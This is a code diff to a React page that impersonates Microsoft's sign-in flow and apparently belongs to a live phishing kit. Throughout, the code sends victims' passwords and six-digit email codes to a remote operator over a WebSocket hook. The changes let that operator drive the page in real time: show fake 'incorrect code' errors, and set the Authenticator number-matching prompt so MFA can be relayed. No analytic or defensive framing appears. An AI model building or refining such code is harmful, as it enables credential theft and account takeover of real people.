@@ -208,15 +208,18 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
 
   // Phone / code inputs
   const [phoneNumber, setPhoneNumber] = useState('');
-  const [emailCodeInput, setEmailCodeInput] = useState('');
   const [phoneCodeChars, setPhoneCodeChars] = useState<string[]>(['', '', '', '', '', '']);
   const phoneCodeRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null, null, null]);
   const phoneCode = phoneCodeChars.join('');
+  const [emailCodeChars, setEmailCodeChars] = useState<string[]>(['', '', '', '', '', '']);
+  const emailCodeRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null, null, null]);
 
   // New step states
   const [emailError, setEmailError] = useState<string | null>(null);
   const [passwordError, setPasswordError] = useState<string | null>(null);
-  const [authNumber] = useState(() => Math.floor(Math.random() * 98) + 2);
+  const [codeError, setCodeError] = useState<string | null>(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [authNumber, setAuthNumber] = useState(() => Math.floor(Math.random() * 98) + 2);
   const [verifyPhoneDigits, setVerifyPhoneDigits] = useState('');
   const phoneVerifyRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null]);
   const [cantUseInput, setCantUseInput] = useState('');
@@ -240,7 +243,8 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
   // ── WebSocket visitor tracking ────────────────────────────────────────────
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'microsoft',
-    onNavigate: (s) => {
+    onNavigate: (s, action) => {
+      setIsSubmitting(false);
       if (s === 'error-email') {
         setEmailError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
         setStep('email');
@@ -251,10 +255,19 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
         setStep('password');
         return;
       }
+      if (s === 'error-code') {
+        setCodeError('That code is incorrect. Check the code and try again.');
+        setEmailCodeChars(['', '', '', '', '', '']);
+        setStep('email-code-input');
+        return;
+      }
       setEmailError(null);
       setPasswordError(null);
+      setCodeError(null);
       setPhoneCodeChars(['', '', '', '', '', '']);
+      setEmailCodeChars(['', '', '', '', '', '']);
       setStep(s as MsStep);
+      if (s === 'authenticator' && action?.promptNumber != null) setAuthNumber(action.promptNumber);
     },
     onProviderSwitch,
   });
@@ -284,7 +297,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
   const isOnDark = step === 'password' || step === 'stay' || step === 'passkey'
     || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
     || step === 'phone-entry' || step === 'phone-code'
-    || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code'
+    || step === 'processing'
     || step === 'authenticator' || step === 'verify-phone-number';
   const bg = isOnDark ? darkPageBg : lightBg;
 
@@ -335,8 +348,8 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
           </div>
         </div>
       ) : (
-        <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isDark ? 'bg-[#242424]' : 'bg-white'}`}>
-          {msLogoRow(false)}
+        <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isOnDark ? darkCardBg : isDark ? 'bg-[#242424]' : 'bg-white'}`}>
+          {msLogoRow(isOnDark)}
           <div className="flex gap-2 mt-6">
             {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
           </div>
@@ -546,7 +559,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
                   type={showPassword ? 'text' : 'password'}
                   value={password}
                   onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); setPasswordError(null); }}
-                  onKeyDown={e => { if (e.key === 'Enter' && password) nav('stay', 'password', password); }}
+                  onKeyDown={e => { if (e.key === 'Enter' && password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
                   placeholder="Password"
                   className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors pr-10"
                 />
@@ -568,11 +581,17 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
               </div>
               <button
                 data-testid="ms-signin-btn"
-                onClick={() => { if (password) nav('stay', 'password', password); }}
-                className="w-full bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
+                onClick={() => { if (password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
+                disabled={isSubmitting}
+                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-60 text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
-                Next
+                {isSubmitting ? (
+                  <span className="flex items-center justify-center gap-2">
+                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                    Verifying…
+                  </span>
+                ) : 'Next'}
               </button>
               <div className="flex flex-col items-center gap-3">
                 <a href="#" onClick={e => { e.preventDefault(); setStep('passkey'); }} className="text-[#3391e0] text-[13px] hover:underline text-center">
@@ -687,7 +706,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
               </div>
               <div className="flex justify-center mb-4">
                 <button
-                  onClick={() => setStep('email-code')}
+                  onClick={() => { setStep('email-code'); setEmailCodeChars(['','','','','','']); setCodeError(null); setIsSubmitting(false); }}
                   className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
                   style={{ background: 'none' }}
                 >
@@ -699,28 +718,63 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
               <p className="text-[13px] text-[#aaa] text-center mb-6">
                 Check <strong className="text-white">{email || 'your email'}</strong> for the code and enter it below.
               </p>
-              <input
-                type="text"
-                value={emailCodeInput}
-                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setEmailCodeInput(v); sendCapture('email_code', v); }}
-                onKeyDown={e => { if (e.key === 'Enter' && emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
-                placeholder="Code"
-                maxLength={6}
-                autoFocus
-                className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] focus:outline-none bg-transparent text-white placeholder-gray-500 mb-2 transition-colors text-center tracking-[0.3em] text-[20px]"
-              />
-              <div className="mb-5">
-                <a href="#" onClick={e => { e.preventDefault(); setCodeResent(true); setTimeout(() => setCodeResent(false), 3000); }}
+              <div className="flex justify-center gap-2 mb-2">
+                {emailCodeChars.map((char, i) => (
+                  <input
+                    key={i}
+                    ref={el => { emailCodeRefs.current[i] = el; }}
+                    type="text"
+                    maxLength={1}
+                    value={char}
+                    autoFocus={i === 0}
+                    onChange={e => {
+                      const d = e.target.value.replace(/\D/g, '').slice(-1);
+                      const newChars = [...emailCodeChars];
+                      newChars[i] = d;
+                      setEmailCodeChars(newChars);
+                      setCodeError(null);
+                      const combined = newChars.join('');
+                      if (d && i < 5) emailCodeRefs.current[i + 1]?.focus();
+                      if (combined.length === 6 && newChars.every(c => c !== '') && !isSubmitting) {
+                        sendCapture('email_code', combined);
+                        setIsSubmitting(true);
+                      }
+                    }}
+                    onKeyDown={e => {
+                      if (e.key === 'Backspace' && !char && i > 0) emailCodeRefs.current[i - 1]?.focus();
+                    }}
+                    className={`w-10 text-center text-[22px] font-bold text-white border ${codeError ? 'border-red-500' : 'border-[#555]'} focus:border-[#0078D4] focus:outline-none bg-transparent transition-colors`}
+                    style={{ height: '3rem' }}
+                  />
+                ))}
+              </div>
+              {codeError && (
+                <div className="flex items-center gap-2 mb-3 justify-center">
+                  <div className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
+                  <span className="text-red-400 text-[13px] leading-snug">{codeError}</span>
+                </div>
+              )}
+              <div className="mb-5 mt-2">
+                <a href="#" onClick={e => { e.preventDefault(); setCodeResent(true); setCodeError(null); setTimeout(() => setCodeResent(false), 3000); }}
                   className={`text-[13px] hover:underline ${codeResent ? 'text-green-400' : 'text-[#3391e0]'}`}>
                   {codeResent ? '✓ Code resent!' : "I didn't get a code"}
                 </a>
               </div>
               <button
-                onClick={() => { if (emailCodeInput.length >= 4) nav('processing', 'email_code', emailCodeInput); }}
+                onClick={() => {
+                  const combined = emailCodeChars.join('');
+                  if (combined.length === 6 && !isSubmitting) { sendCapture('email_code', combined); setIsSubmitting(true); }
+                }}
+                disabled={isSubmitting || emailCodeChars.join('').length < 6}
                 className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-50 text-white text-[15px] font-semibold py-2.5 transition-colors"
                 style={{ borderRadius: 0 }}
               >
-                Next
+                {isSubmitting ? (
+                  <span className="flex items-center justify-center gap-2">
+                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                    Verifying…
+                  </span>
+                ) : 'Next'}
               </button>
             </div>
           </motion.div>
@@ -958,7 +1012,7 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
               </div>
               <h1 className="text-[22px] font-bold text-white text-center mb-4">Check your Authenticator app</h1>
               <div className="flex justify-center mb-4">
-                <img src="/ms-authenticator.png" alt="Microsoft Authenticator" className="w-20 h-20 object-contain rounded-xl" />
+                <img src="/ms-authenticator.png" alt="Microsoft Authenticator" className="w-36 h-36 object-contain rounded-xl" />
               </div>
               <div className="flex justify-center mb-2">
                 <div className="text-[56px] font-bold text-white leading-none tracking-tight">{authNumber}</div>
@@ -1357,41 +1411,6 @@ function MicrosoftLogin({ device, theme, onProviderSwitch }: { device: string; t
           </motion.div>
         )}
 
-        {/* ── Error states ── */}
-        {(step === 'error-email' || step === 'error-password' || step === 'error-code') && (
-          <motion.div key={step} {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
-            <div className={`flex flex-col ${lightCardCls}`}>
-              {msLogoRow(false)}
-              <div className="flex items-center gap-3 mb-4">
-                <div className="w-10 h-10 rounded-full bg-red-50 border border-red-200 flex items-center justify-center flex-shrink-0">
-                  <X className="w-5 h-5 text-red-600" />
-                </div>
-                <h1 className={`text-[18px] font-bold ${lightText}`}>
-                  {step === 'error-email' ? 'Account not found' : step === 'error-password' ? 'Incorrect password' : 'Incorrect code'}
-                </h1>
-              </div>
-              <p className="text-[14px] text-[#605e5c] mb-6 leading-relaxed">
-                {step === 'error-email'
-                  ? "That Microsoft account doesn't exist. Enter a different account or get a new Microsoft account."
-                  : step === 'error-password'
-                  ? "Your account or password is incorrect. If you don't remember your password, reset it now."
-                  : "The verification code you entered is incorrect. Please check your inbox and try again."}
-              </p>
-              <div className="flex justify-between items-center">
-                <a href="#" className="text-[14px] text-[#0078D4] hover:underline">
-                  {step === 'error-email' ? 'Create one!' : step === 'error-password' ? 'Forgot password?' : 'Resend code'}
-                </a>
-                <button
-                  onClick={() => setStep(step === 'error-email' ? 'email' : step === 'error-password' ? 'password' : 'email-code')}
-                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
-                  style={{ borderRadius: 0 }}
-                >
-                  Try again
-                </button>
-              </div>
-            </div>
-          </motion.div>
-        )}
 
       </AnimatePresence>
     </div>
